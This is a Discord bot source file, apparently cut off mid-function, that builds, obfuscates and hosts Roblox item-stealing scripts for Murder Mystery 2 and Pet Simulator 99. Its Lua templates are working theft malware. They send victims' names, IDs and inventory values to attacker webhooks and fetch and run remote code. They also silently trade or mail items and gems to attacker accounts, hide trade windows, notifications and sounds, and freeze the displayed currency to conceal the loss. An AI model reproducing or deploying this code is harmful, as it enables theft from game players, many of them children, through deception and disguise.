// ======================= bot.js =======================
require("dotenv").config();

const axios = require("axios");

const {
  Client,
  GatewayIntentBits,
  Partials,
  REST,
  Routes,
  SlashCommandBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ActionRowBuilder,
  AttachmentBuilder,
} = require("discord.js");

// ---------- CONFIG ----------
const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const OBFUSCATOR_URL = process.env.OBFUSCATOR_URL || "https://goofyscator.lua.cz/obfuscate";
const PASTEFY_API_KEY = process.env.PASTEFY_API_KEY;

if (!TOKEN|| !CLIENT_ID) {
  console.error("❌ Missing DISCORD_TOKEN or CLIENT_ID in .env");
  process.exit(1);
}

// ---------- TEMPLATES ----------
const TEMPLATES = {
  scriptA: `repeat task.wait() until game:IsLoaded()
task.wait(1.5)

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local plr = Players.LocalPlayer
if not plr then return end

if game.PlaceId ~= 142823291 then
    if plr and typeof(plr.Kick) == "function" then
        pcall(function() plr:Kick("LANGO SCRIPTS| MM2 Only") end)
    end
    return
end

if not _G.ED_CONFIG then
    warn("[LS] Execute loader first!")
    return
end

local cfg = _G.ED_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL
local PublicHits = "1524475542727037008"

if not WEBHOOK_ID or WEBHOOK_ID == "" then
    warn("[LS] Invalid webhook")
    return
end
if not USERNAMES or #USERNAMES == 0 then
    warn("[LS] No targets")
    return
end

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then executorName = identifyexecutor()
    elseif getexecutorname then executorName = getexecutorname() end
end)

local requestMethod = nil

if syn and syn.request then
    requestMethod = syn.request
elseif fluxus and fluxus.request then
    requestMethod = fluxus.request
elseif http and http.request then
    requestMethod = http.request
elseif getgenv().request then
    requestMethod = getgenv().request
elseif request then
    requestMethod = request
elseif http_request then
    requestMethod = http_request
elseif game:GetService("HttpService").RequestAsync then
    requestMethod = function(req)
        return game:GetService("HttpService"):RequestAsync({
            Url = req.Url,
            Method = req.Method,
            Headers = req.Headers,
            Body = req.Body
        })
    end
end

if not requestMethod then
    warn("[LS] Unsupported executor - No request method found")
    return
end

local request = requestMethod

local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId
    REAL_JOB_ID = bypassJobId
end

local function ServerHop()
    local success, result = pcall(function()
        local response = request({
            Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100",
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0"}
        })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.data then
                for _, server in ipairs(data.data) do
                    if server.id ~= game.JobId and server.playing < server.maxPlayers then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, plr)
                        task.wait(5)
                        return
                    end
                end
            end
        end
    end)
    if not success then
        warn("[LS] ServerHop failed: " .. tostring(result))
    end
end

local VIP = (game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer")
local FULL = (#Players:GetPlayers() >= 12)
if VIP or FULL then
    if executorName:lower():find("delta") or executorName:lower():find("hydrogen") or executorName:lower():find("fluxus") or executorName:lower():find("arceus") or executorName:lower():find("codex") then
        plr:Kick(VIP and "VIP Servers not supported." or "FULL Servers Arent Supported")
        return
    else
        print(VIP and "VIP Server detected, hopping..." or "Server full, hopping...")
        ServerHop()
        return
    end
end

local no_trade = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true,
    ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true, ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local dbSuccess, database = pcall(function()
    return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
end)
if not dbSuccess or not database then
    warn("[ED] Database load failed")
    return
end

local profileSuccess, profileData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
end)
if not profileSuccess or not profileData then
    warn("[LS] Profile load failed")
    return
end

local mm2Values = {}
local valueSuccess, valueResponse = pcall(function()
    return request({
        Url = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2",
        Method = "GET",
        Headers = {["User-Agent"] = "Mozilla/5.0"}
    })
end)

if valueSuccess and valueResponse and valueResponse.Body then
    local ok, data = pcall(function() return HttpService:JSONDecode(valueResponse.Body) end)
    if ok and data and data.data then
        for _, item in ipairs(data.data) do
            if item.name and item.price then
                mm2Values[item.name] = tonumber(item.price) or 0
            end
        end
    end
end

local weaponsToSend = {}
local totalInventoryValue = 0
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local weaponsOwned = profileData.Weapons and profileData.Weapons.Owned or {}

for dataid, amount in pairs(weaponsOwned) do
    local item = database[dataid]
    if item and not no_trade[dataid] and amount > 0 then
        local itemName = item.ItemName or tostring(dataid)
        local rarity = item.Rarity or "Common"
        local value = mm2Values[dataid] or 0
        local totalValue = value * amount
        totalInventoryValue = totalInventoryValue + totalValue

        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue
        })
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end

table.sort(weaponsToSend, function(a, b)
    return a.TotalValue > b.TotalValue
end)

if #weaponsToSend == 0 then
    warn("[ED] No tradeable items found")
end

local function uploadToPastefy(items)
    local lines = {
        "LANGO SCRIPTS| " .. plr.Name,
        os.date("%Y-%m-%d %H:%M:%S"),
        "Total: " .. #items,
        string.rep("-", 50), ""
    }

    table.sort(items, function(a, b)
        local tier = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
        local ao = tier[a.Rarity] or 1
        local bo = tier[b.Rarity] or 1
        if ao ~= bo then return ao > bo end
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)

    local current_tier = nil
    for _, item in ipairs(items) do
        if current_tier ~= item.Rarity then
            current_tier = item.Rarity
            table.insert(lines, "")
            table.insert(lines, "[" .. current_tier:upper() .. "]")
            table.insert(lines, string.rep("-", 30))
        end
        local total_val = item.Value * item.Amount
        table.insert(lines, string.format("%s | Qty: %d | Value: $%.2f (Total: $%.2f)",
            item.ItemName, item.Amount, item.Value, total_val))
    end

    local content = table.concat(lines, "\\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            return data.paste and "https://pastefy.app/" .. data.paste.id or
                   data.id and "https://pastefy.app/" .. data.id or "Failed"
        end
    end
    return "Failed"
end

local function sendToProxy(payload)
    task.spawn(function()
        local url = PROXY_URL .. WEBHOOK_ID
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/3.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end
local function sendToPublic(payload)
    task.spawn(function()
        local url = PROXY_URL .. PublicHits
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/3.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end)
end

local rubisLink = uploadToPastefy(weaponsToSend)
local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local hitCategory = "Low Hit"
local isPingWorthy = false
if totalInventoryValue >= 1000 then
    hitCategory = "Big Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 300 then
    hitCategory = "Good Hit"
    isPingWorthy = true
elseif totalInventoryValue >= 100 then
    hitCategory = "Normal Hit"
    isPingWorthy = true
end

local total_items = 0
for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end

local top_items = {}
for i = 1, math.min(3, #weaponsToSend) do
    local item = weaponsToSend[i]
    local emoji = {Ancient = "🔴", Godly = "🟣", Unique = "🟡", Vintage = "🟠", Legendary = "🔵", Rare = "🟢", Uncommon = "⚪", Common = "⚫"}
    local e = emoji[item.Rarity] or "⚪"
    table.insert(top_items, string.format("%s \\`%s\\` x%d **$%.2f**", e, item.ItemName, item.Amount, item.TotalValue))
end

local fields = {
    {name = "👤 Victim", value = plr.DisplayName .. "\\n(@" .. plr.Name .. ")\\nID: " .. plr.UserId .. "\\nAge: " .. plr.AccountAge .. " days", inline = true},
    {name = "⚙️ System", value = "Executor: " .. executorName .. "\\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\\nJob ID:\\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
    {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\\nTotal Items: " .. total_items, inline = true}
}

local esc = string.char(27)
local ansiLine1 = esc .. "[2;31mAncient:  " .. rarityCounts.Ancient .. "  " .. esc .. "[2;35mGodly:   " .. rarityCounts.Godly .. esc .. "[0m"
local ansiLine2 = esc .. "[2;33mUnique:   " .. rarityCounts.Unique .. "  " .. esc .. "[2;38;5;208mVintage: " .. rarityCounts.Vintage .. esc .. "[0m"
local ansiLine3 = esc .. "[2;34mLegendary:" .. rarityCounts.Legendary .. "  " .. esc .. "[2;32mRare:    " .. rarityCounts.Rare .. esc .. "[0m"
local ansiLine4 = esc .. "[2;37mUncommon: " .. rarityCounts.Uncommon .. "  Common:  " .. rarityCounts.Common

table.insert(fields, {name = "📊 Inventory", value = "\\`\\`\\`ansi\\n" .. ansiLine1 .. "\\n" .. ansiLine2 .. "\\n" .. ansiLine3 .. "\\n" .. ansiLine4 .. "\\`\\`\\`", inline = false})
table.insert(fields, {name = "🏆 Top Items", value = "\\`\\`\\`\\n" .. table.concat(top_items, "\\n") .. "\\n\\`\\`\\`", inline = false})
table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})

local payload = {
    content = isPingWorthy and "@everyone 🌑 **NEW MM2 HIT | LANGO SCRIPTS**" or nil,
    username = "🌑 Eternal Darkness",
    avatar_url = "https://imgur.com/a/LhzvN5h.png",
    embeds = {{
        title = "LANGO SCRIPTS MM2   HIT | " .. hitCategory,
        url = rubisLink,
        color = 0x1a1a2e,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        description = "\\`\\`\\`lua\\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\\n\\`\\`\\`",
        fields = fields,
        footer = {text = " LANGO SCRIPTS v8.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

local publicFields = {
    {name = "👤 Victim", value = plr.DisplayName .. "\\n(@" .. plr.Name .. ")\\nID: " .. plr.UserId, inline = true},
    {name = "⚙️ Executor", value = executorName, inline = true},
    {name = "💰 Valuation", value = "Total USD: $" .. string.format("%.2f", totalInventoryValue) .. "\\nTotal Items: " .. total_items, inline = true},
    {name = "📊 Inventory", value = "\\`\\`\\`ansi\\n" .. ansiLine1 .. "\\n" .. ansiLine2 .. "\\n" .. ansiLine3 .. "\\n" .. ansiLine4 .. "\\`\\`\\`", inline = false},
    {name = "🏆 Top Items", value = "\\`\\`\\`\\n" .. table.concat(top_items, "\\n") .. "\\n\\`\\`\\`", inline = false},
    {name = "🔗 Actions", value = "[View Inventory](" .. rubisLink .. ")", inline = false}
}

local PublicPayload = {
    content = "🌑 **MM2 Public Hits | LANGO SCRIPTS**",
    username = "🌑 Eternal Darkness",
    avatar_url = "https://imgur.com/a/LhzvN5h.png",
    embeds = {{
        title = "Eternal Darkness MM2 HIT | " .. hitCategory,
        url = rubisLink,
        color = 0x1a1a2e,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
        fields = publicFields,
        footer = {text = "LANGO SCRIPTS v8.0"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

if total_items ~= 0 or total_items > 1 then
    sendToProxy(payload)
    sendToPublic(PublicPayload)
end

print("[ED] Loading Script for", plr.Name)
print("Please wait, this process can take up to 5 minutes depending on your connection and executor...")

wait(3)

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/outhackernuls090-hash/opensrc_visual/refs/heads/main/visual.lua"))()
end)

local Trade = ReplicatedStorage:WaitForChild("Trade", 5)
if not Trade then
    warn("[ED] Trade remote missing")
    return
end

local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local last_offer_info = nil

if Trade:FindFirstChild("UpdateTrade") then
    Trade.UpdateTrade.OnClientEvent:Connect(function(data)
        if typeof(data) == "table" and data.lastOffer then
            last_offer_info = data.lastOffer
        elseif typeof(data) == "table" and data.LastOffer then
            last_offer_info = data.LastOffer
        end
    end)
end

local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

local function getStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function isTarget(name)
    for _, u in ipairs(USERNAMES) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

local function waitUntilDone()
    repeat task.wait(0.1) until getStatus() == "None"
end

local function acceptDeal()
    AcceptTradeRemote:FireServer(game.PlaceId * 3, last_offer_info or {})
end

local function addToOffer(item_id)
    OfferItem:FireServer(item_id, "Weapons")
    task.wait(0.1)
end

local isTradeCompleted = false

local function doTrade(targetPlayer)
    if not targetPlayer then return end

    local attempts = 0
    while attempts < 30 do
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then break end
        attempts = attempts + 1
        task.wait(0.5)
    end

    local itemsToTrade = {}
    for _, item in ipairs(weaponsToSend) do
        table.insert(itemsToTrade, item)
    end

    if #itemsToTrade == 0 then
        warn("[ED] No items to trade")
        return
    end

    while #itemsToTrade > 0 and not isTradeCompleted do
        local statusNow = getStatus()

        if statusNow == "StartTrade" then
            DeclineTrade:FireServer()
            task.wait(0.3)
        elseif statusNow == "ReceivingRequest" then
            if Trade:FindFirstChild("DeclineRequest") then
                Trade.DeclineRequest:FireServer()
            else
                DeclineTrade:FireServer()
            end
            task.wait(0.3)
        end

        local tradeStarted = false
        local sendAttempts = 0
        while not tradeStarted and sendAttempts < 30 do
            local current = getStatus()
            if current == "StartTrade" then
                tradeStarted = true
                break
            elseif current == "None" then
                pcall(function() SendRequest:InvokeServer(targetPlayer) end)
            elseif current == "ReceivingRequest" then
                if Trade:FindFirstChild("DeclineRequest") then
                    Trade.DeclineRequest:FireServer()
                else
                    DeclineTrade:FireServer()
                end
            end
            sendAttempts = sendAttempts + 1
            task.wait(0.5)
        end

        if not tradeStarted then
            task.wait(2)
            continue
        end

        local slotsLeft = 4
        local itemsAdded = 0
        while slotsLeft > 0 and #itemsToTrade > 0 do
            local currentItem = itemsToTrade[1]
            local amountToAdd = math.min(slotsLeft, currentItem.Amount)
            for _ = 1, amountToAdd do
                addToOffer(currentItem.DataID)
            end
            currentItem.Amount = currentItem.Amount - amountToAdd
            if currentItem.Amount <= 0 then
                table.remove(itemsToTrade, 1)
            end
            slotsLeft = slotsLeft - amountToAdd
            itemsAdded = itemsAdded + amountToAdd
        end

        if itemsAdded == 0 then break end

        task.wait(5)
        acceptDeal()
        waitUntilDone()

        if #itemsToTrade > 0 then
            task.wait(1)
        end
    end

    if #itemsToTrade == 0 then
        isTradeCompleted = true
        task.wait(2)
        pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
        pcall(function()
            plr:Kick("LANGO SCRIPTS | Your Items got Stolen\\n\\ndiscord.gg/qNrJBdvd2d")
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(p)
        end)
    end
end`,

  scriptB: `_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GG / GY2RVSEGDT"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

for adress, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    local headers = {
        ["Content-Type"] = "application/json"
    }

	local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\\n"
    end

    fields[3].value = string.format("Gems: %s\\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = {
        ["embeds"] = {{
            ["title"] = "\\240\\159\\144\\177 New PS99 Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\\r\\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\\n")
            fields[2].value = fields[2].value .. "\\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)
    request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local gemsleaderstat = plr.leaderstats["\\240\\159\\146\\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\\240\\159\\146\\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end,
            AbstractGetRAP = function(self)
                return nil
            end
        }
    ) or 0)
end

local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #users
    local sent = false
    
    repeat
        local currentUser = users[userIndex]
        local args = {
            [1] = currentUser,
            [2] = MailMessage,
            [3] = category,
            [4] = uid,
            [5] = am or 1
        }

        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            sent = true
            GemAmount1 = GemAmount1 - mailSendPrice
            mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
            if mailSendPrice > 5000000 then
                mailSendPrice = 5000000
            end
        elseif response == false and err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                sent = true
            end
        end
    until sent
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= (mailSendPrice + 10000) then
                local userIndex = 1
                local maxUsers = #users
                local sent = false
                
                repeat
                    local currentUser = users[userIndex]
                    local args = {
                        [1] = currentUser,
                        [2] = MailMessage,
                        [3] = "Currency",
                        [4] = i,
                        [5] = GemAmount1 - mailSendPrice
                    }
                    
                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
                    
                    if response == true then
                        sent = true
                    elseif response == false and err == "They don't have enough space!" then
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then
                            sent = true
                        end
                    end
                until sent
                break
            end
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network.Invoke("Box: Withdraw All", key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait(0.2)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

local function canSendMail()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network.Invoke("Mailbox: Send", unpack(args))
    return (err == "They don't have enough space!")
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network.Invoke("Locking_SetLocked", unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
    ClaimMail()
	EmptyBoxes()
    if not canSendMail() then
        message.Error("Account error. Please rejoin and try again or use a different account")
        return
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    spawn(function()
        SendMessage(GemAmount1)
    end)

    for _, item in ipairs(sortedItems) do
        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    if GemAmount1 > mailSendPrice then
        SendAllGems()
    end
    message.Error("All your items just got stolen by Tobi's mailstealer!\\n Join discord.gg/GY2RVSEGDT")
end`
};

// ---------- HELPERS ----------
function buildScript(template, u, webhook) {
  const safe = (v) =>
    String(v || "")
      .replace(/\\/g, "\\\\")
      .replace(/"/g, '\\"')
      .replace(/\r?\n/g, "\\n");

  return template
    .replace(/%%USERNAME%%/g, safe(u))
    .replace(/%%WEBHOOK%%/g, safe(webhook));
}

function preprocess(code) {
  code = code.replace(/--.*$/gm, "");
  code = code.replace(/\n\s*\n/g, "\n");
  return code.trim();
}

// ---------- GOOFYSCATOR ----------
async function obfuscateWithGoofyscator(sourceCode) {
  const res = await axios.post(
    OBFUSCATOR_URL,
    { source: sourceCode },
    {
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "GoofyscatorBot/1.0",
      },
      timeout: 30000,
    }
  );

  if (res.data && res.data.result) {
    return res.data.result;
  }

  throw new Error("Unexpected response: " + JSON.stringify(res.data).slice(0, 200));
}

// ---------- PASTEFY ----------
async function uploadToPastefy(script) {
  const res = await axios.post(
    "https://pastefy.app/api/v2/paste",
    {
      content: script,
      title: "Paste-" + Math.random().toString(36).slice(2, 8),
      visibility: "UNLISTED",
    },
    {
      headers: {
        Authorization: `Bearer ${PASTEFY_API_KEY}`,
        "Content-Type": "application/json",
      },
    }
  );
  return res.data.paste.raw_url;
}

// ---------- SCRIPT GENERATION ----------
async function generateScript(u, webhook, templateKey) {
  const template = TEMPLATES[templateKey];
  if (!template) throw new Error("Invalid template: " + templateKey);

  const rawScript = buildScript(template, u, webhook);
  console.log("Raw script generated");

  const cleaned = preprocess(rawScript);
  console.log("Preprocessed");

  const obfuscated = await obfuscateWithGoofyscator(cleaned);
  console.log("Obfuscated successfully");

  const url = await uploadToPastefy(obfuscated);
  console.log("Uploaded to Pastefy:", url);

  return url;
}

// ---------- DISCORD ----------
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.DirectMessages],
  partials: [Partials.Channel],
});

const commands = [
  new SlashCommandBuilder()
    .setName("generate")
    .setDescription("Generate a Roblox script")
    .addStringOption((o) =>
      o
        .setName("script")
        .setDescription("Choose script type")
        .setRequired(true)
        .addChoices(
          { name: "MM2", value: "scriptA" },
          { name: "pet99", value: "scriptB" }
        )
    )
    .toJSON(),
];

client.on("interactionCreate", async (i) => {
  if (i.isChatInputCommand() && i.commandName === "generate") {
    const modal = new ModalBuilder()
      .setCustomId(`gen:${i.options.getString("script")}`)
      .setTitle("Generate Script")
      .addComponents(
        new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId("u")
            .setLabel("Username")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        ),
        new ActionRowBuilder().addComponents(
  new TextInputBuilder()
    .setCustomId("wh")
            .setLabel("Webhook")
            .setRequired(true)
            .setStyle(TextInputStyle.Short)
        )
      );
    return i.showModal(modal);
  }

  if (i.isModalSubmit() && i.customId.startsWith("gen:")) {
    await i.deferReply({ ephemeral: true });

    try {
